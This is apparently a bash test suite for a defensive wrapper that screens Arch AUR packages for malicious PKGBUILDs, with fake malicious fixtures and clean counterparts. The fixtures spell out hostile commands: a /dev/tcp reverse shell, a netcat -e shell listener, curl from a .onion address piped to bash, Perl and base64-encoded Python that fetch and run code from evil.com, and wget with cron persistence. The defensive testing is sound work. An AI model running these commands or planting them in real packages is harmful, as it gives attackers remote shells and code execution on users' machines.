#!/bin/bash
# AUR-GUARD Test Suite
# Run: bash docs/aur-guard-tests.sh
# Tests the ~/bin/yay wrapper against various attack patterns

set -uo pipefail

PASS=0
FAIL=0
YAY_SCRIPT="/home/awcator/bin/yay"

RED='\033[1;31m'
GRN='\033[1;32m'
CYN='\033[1;36m'
BLD='\033[1m'
RST='\033[0m'

# ─── Test Harness ─────────────────────────────────────────────────────────────

run_test() {
    local expected="$1"  # BLOCK or ALLOW
    local name="$2"
    shift 2

    local TMPTEST=$(mktemp -d)
    mkdir -p "$TMPTEST/test-pkg"
    cd "$TMPTEST/test-pkg"
    git init -q

    # Run setup function (creates PKGBUILD + other files)
    "$@"

    git add -A
    git commit -q -m "init" --author="Anon <a@b.com>" 2>/dev/null

    git clone --bare "$TMPTEST/test-pkg" "$TMPTEST/test-pkg.git" 2>/dev/null
    git daemon --reuseaddr --base-path="$TMPTEST" --export-all --port=9418 &
    local PID=$!
    sleep 0.5

    # Patch script to use local git daemon
    sed "s|https://aur.archlinux.org/\${pkg}.git|git://localhost:9418/test-pkg.git|" "$YAY_SCRIPT" > /tmp/yay-test-runner
    chmod +x /tmp/yay-test-runner

    local output=$(/tmp/yay-test-runner -S test-pkg --noconfirm 2>&1)
    local result="ALLOW"
    echo "$output" | grep -q "BLOCK" && result="BLOCK"

    kill $PID 2>/dev/null
    wait $PID 2>/dev/null
    rm -rf "$TMPTEST"
    cd /home/awcator

    if [ "$result" == "$expected" ]; then
        echo -e "  ${GRN}✓ PASS${RST} [$expected] $name"
        ((PASS++))
    else
        echo -e "  ${RED}✗ FAIL${RST} [$expected] $name (got $result)"
        echo "$output" | grep -E "CRITICAL|WARNING|✗|!" | sed 's/^/    /'
        ((FAIL++))
    fi
}

# ─── Negative Tests (should BLOCK) ───────────────────────────────────────────

echo -e "${BLD}═══ NEGATIVE TESTS (expect BLOCK) ═══${RST}"

# Test 1: Classic ELF binary with network functions + sudo in build
setup_elf_netfunc_sudo() {
    cat > PKGBUILD << 'EOF'
pkgname=test-pkg
pkgver=1.0
pkgrel=1
pkgdesc="Totally legit"
arch=('x86_64')
depends=('sudo')
source=("https://github.com/EvilHacker/project/archive/v1.0.tar.gz" "helper")
sha256sums=('SKIP' 'SKIP')
build() {
    sudo ./helper
}
package() {
    install -Dm755 helper "$pkgdir/usr/bin/helper"
}
EOF
    printf '\x7fELF\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00' > helper
    printf 'socket\x00connect\x00inet_addr\x00system\x00execve\x00' >> helper
    chmod +x helper
}
run_test "BLOCK" "ELF binary + network funcs + sudo in build" setup_elf_netfunc_sudo

# Test 2: Python base64 exec payload in prepare()
setup_python_b64_exec() {
    cat > PKGBUILD << 'EOF'
pkgname=test-pkg
pkgver=1.0
pkgrel=1
pkgdesc="Utility"
arch=(x86_64)
depends=(python)
source=("https://example.com/src.tar.gz")
sha256sums=("SKIP")
prepare() {
    python -c "exec(__import__('base64').b64decode('aW1wb3J0IG9zO29zLnN5c3RlbSgiY3VybCBodHRwOi8vZXZpbC5jb20vcCB8IGJhc2gi'))"
}
build() { make; }
package() { make DESTDIR="$pkgdir" install; }
EOF
}
run_test "BLOCK" "Python base64 exec in prepare()" setup_python_b64_exec

# Test 3: ELF binary disguised as image file
setup_disguised_elf() {
    cat > PKGBUILD << 'EOF'
pkgname=test-pkg
pkgver=1.0
pkgrel=1
pkgdesc="Nice app"
arch=(x86_64)
depends=(gtk3)
source=("https://github.com/real-project/app/archive/v${pkgver}.tar.gz" "icon.png")
sha256sums=("abcd1234" "efgh5678")
build() { make; }
package() {
    install -Dm755 app "$pkgdir/usr/bin/app"
    install -Dm644 icon.png "$pkgdir/usr/share/pixmaps/app.png"
}
EOF
    printf '\x7fELF\x02\x01\x01\x00' > icon.png
    printf 'socket\x00connect\x00system\x00' >> icon.png
}
run_test "BLOCK" "ELF binary disguised as icon.png" setup_disguised_elf

# Test 4: Reverse shell in .install post_install hook
setup_reverse_shell_install() {
    cat > PKGBUILD << 'EOF'
pkgname=test-pkg
pkgver=2.0
pkgrel=1
pkgdesc="Network tool"
arch=(x86_64)
depends=(glibc)
install=test-pkg.install
source=("https://github.com/legit/nettool/archive/v${pkgver}.tar.gz")
sha256sums=("1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef")
build() { make; }
package() { install -Dm755 nettool "$pkgdir/usr/bin/nettool"; }
EOF
    cat > test-pkg.install << 'EOF'
post_install() {
    /bin/bash -c 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1' &
}
EOF
}
run_test "BLOCK" "Reverse shell in .install post_install" setup_reverse_shell_install

# Test 5: curl to .onion in build function
setup_tor_download() {
    cat > PKGBUILD << 'EOF'
pkgname=test-pkg
pkgver=1.0
pkgrel=1
pkgdesc="Privacy tool"
arch=(x86_64)
depends=(tor)
source=("https://github.com/someone/privtool/archive/v1.0.tar.gz")
sha256sums=("SKIP")
build() {
    curl -s http://abc123xyz.onion/config.sh | bash
    make
}
package() { make DESTDIR="$pkgdir" install; }
EOF
}
run_test "BLOCK" "curl to .onion URL in build()" setup_tor_download

# Test 6: Netcat listener in .install
setup_nc_listener() {
    cat > PKGBUILD << 'EOF'
pkgname=test-pkg
pkgver=1.5
pkgrel=1
pkgdesc="Service daemon"
arch=(x86_64)
depends=(glibc)
install=test-pkg.install
source=("https://github.com/gooddev/daemon/archive/v1.5.tar.gz")
sha256sums=("aabbccdd")
build() { make; }
package() { install -Dm755 daemon "$pkgdir/usr/bin/daemon"; }
EOF
    cat > test-pkg.install << 'EOF'
post_install() {
    nc -lp 9999 -e /bin/sh &
}
post_upgrade() {
    post_install
}
EOF
}
run_test "BLOCK" "Netcat backdoor listener in .install" setup_nc_listener

# Test 7: Perl one-liner downloading payload
setup_perl_exec() {
    cat > PKGBUILD << 'EOF'
pkgname=test-pkg
pkgver=1.0
pkgrel=1
pkgdesc="Build helper"
arch=(x86_64)
depends=(perl)
source=("https://cpan.org/authors/id/X/XX/XXX/Helper-1.0.tar.gz")
sha256sums=("SKIP")
prepare() {
    perl -e 'use LWP::Simple;exec(get("http://evil.com/p"))'
}
build() { make; }
package() { make DESTDIR="$pkgdir" install; }
EOF
}
run_test "BLOCK" "Perl one-liner with exec + download" setup_perl_exec

# Test 8: eval with hex-encoded payload
setup_hex_eval() {
    cat > PKGBUILD << 'EOF'
pkgname=test-pkg
pkgver=1.0
pkgrel=1
pkgdesc="Config tool"
arch=(x86_64)
depends=(bash)
source=("https://github.com/someone/cfgtool/archive/v1.0.tar.gz")
sha256sums=("deadbeef")
build() {
    eval $(printf '\x63\x75\x72\x6c\x20\x68\x74\x74\x70')
    make
}
package() { make DESTDIR="$pkgdir" install; }
EOF
}
run_test "BLOCK" "eval with printf hex-encoded payload" setup_hex_eval

# Test 9: .install with cron persistence + wget
setup_cron_persistence() {
    cat > PKGBUILD << 'EOF'
pkgname=test-pkg
pkgver=3.0
pkgrel=1
pkgdesc="System optimizer"
arch=(x86_64)
depends=(glibc)
install=test-pkg.install
source=("https://github.com/optimizer-dev/sysopt/archive/v3.0.tar.gz")
sha256sums=("11223344")
build() { make; }
package() { install -Dm755 sysopt "$pkgdir/usr/bin/sysopt"; }
EOF
    cat > test-pkg.install << 'EOF'
post_install() {
    wget -q http://example.com/update.sh -O /tmp/.update
    (crontab -l 2>/dev/null; echo "*/5 * * * * /tmp/.update") | crontab -
}
EOF
}
run_test "BLOCK" ".install with wget + cron persistence" setup_cron_persistence

# Test 10: Unreferenced ELF binary (orphan file not in source=())
setup_orphan_binary() {
    cat > PKGBUILD << 'EOF'
pkgname=test-pkg
pkgver=1.0
pkgrel=1
pkgdesc="Simple tool"
arch=(x86_64)
depends=(glibc)
source=("https://github.com/dev/tool/archive/v1.0.tar.gz")
sha256sums=("aabbccdd")
build() { make; }
package() { install -Dm755 tool "$pkgdir/usr/bin/tool"; }
EOF
    # This binary is NOT in source=() — it's orphaned in the tree
    printf '\x7fELF\x02\x01\x01\x00' > backdoor
    printf 'socket\x00connect\x00system\x00/tmp/.cache\x00' >> backdoor
    chmod +x backdoor
}
run_test "BLOCK" "Unreferenced ELF binary (orphan file)" setup_orphan_binary

# ─── Positive Tests (should ALLOW) ───────────────────────────────────────────

echo -e "\n${BLD}═══ POSITIVE TESTS (expect ALLOW) ═══${RST}"

# Test P1: Clean python package from PyPI
setup_clean_python() {
    cat > PKGBUILD << 'EOF'
pkgname=test-pkg
pkgver=2.1.0
pkgrel=1
pkgdesc="A helpful Python library"
arch=(any)
depends=(python python-requests)
makedepends=(python-build python-installer python-wheel)
source=("https://files.pythonhosted.org/packages/source/h/helplib/helplib-${pkgver}.tar.gz")
sha256sums=('a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2')
build() {
    cd "helplib-${pkgver}"
    python -m build --wheel --no-isolation
}
package() {
    cd "helplib-${pkgver}"
    python -m installer --destdir="$pkgdir" dist/*.whl
    install -Dm644 LICENSE "$pkgdir/usr/share/licenses/$pkgname/LICENSE"
}
EOF
}
run_test "ALLOW" "Clean Python package from PyPI" setup_clean_python

# Test P2: Standard C project with autotools
setup_clean_autotools() {
    cat > PKGBUILD << 'EOF'
pkgname=test-pkg
pkgver=3.2.1
pkgrel=1
pkgdesc="Fast compression library"
arch=(x86_64)
depends=(glibc)
makedepends=(cmake)
source=("https://github.com/known-org/fastcomp/archive/v${pkgver}.tar.gz")
sha256sums=('fedcba9876543210fedcba9876543210fedcba9876543210fedcba9876543210')
build() {
    cd "fastcomp-${pkgver}"
    cmake -B build -DCMAKE_INSTALL_PREFIX=/usr
    cmake --build build
}
package() {
    cd "fastcomp-${pkgver}"
    DESTDIR="$pkgdir" cmake --install build
    install -Dm644 LICENSE "$pkgdir/usr/share/licenses/$pkgname/LICENSE"
}
EOF
}
run_test "ALLOW" "Standard C project with cmake" setup_clean_autotools

# Test P3: Binary package (-bin) with proper checksums
setup_clean_bin() {
    cat > PKGBUILD << 'EOF'
pkgname=test-pkg
pkgver=4.0.0
pkgrel=1
pkgdesc="Prebuilt application"
arch=(x86_64)
depends=(glibc gtk3 libnotify)
source=("https://github.com/official-org/myapp/releases/download/v${pkgver}/myapp-${pkgver}-linux-x64.tar.gz")
sha256sums=('1234abcd1234abcd1234abcd1234abcd1234abcd1234abcd1234abcd1234abcd')
package() {
    install -Dm755 myapp "$pkgdir/usr/bin/myapp"
    install -Dm644 myapp.desktop "$pkgdir/usr/share/applications/myapp.desktop"
    install -Dm644 myapp.png "$pkgdir/usr/share/pixmaps/myapp.png"
}
EOF
}
run_test "ALLOW" "Clean -bin package with proper checksums" setup_clean_bin

# Test P4: Package with legitimate .install (systemd enable)
setup_clean_install_hook() {
    cat > PKGBUILD << 'EOF'
pkgname=test-pkg
pkgver=1.0
pkgrel=1
pkgdesc="Background service"
arch=(x86_64)
depends=(glibc systemd)
install=test-pkg.install
source=("https://github.com/gooddev/bgservice/archive/v${pkgver}.tar.gz")
sha256sums=('abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890')
build() { make; }
package() {
    install -Dm755 bgservice "$pkgdir/usr/bin/bgservice"
    install -Dm644 bgservice.service "$pkgdir/usr/lib/systemd/system/bgservice.service"
}
EOF
    cat > test-pkg.install << 'EOF'
post_install() {
    echo "Enable the service with: systemctl enable --now bgservice"
}

post_upgrade() {
    systemctl daemon-reload
}
EOF
}
run_test "ALLOW" "Package with legitimate .install hook" setup_clean_install_hook

# ─── Summary ─────────────────────────────────────────────────────────────────

echo -e "\n${BLD}═══ RESULTS ═══${RST}"
echo -e "  ${GRN}PASSED: $PASS${RST}"
echo -e "  ${RED}FAILED: $FAIL${RST}"
echo ""

if [ $FAIL -eq 0 ]; then
    echo -e "${GRN}All tests passed!${RST}"
    exit 0
else
    echo -e "${RED}$FAIL test(s) failed!${RST}"
    exit 1
fi
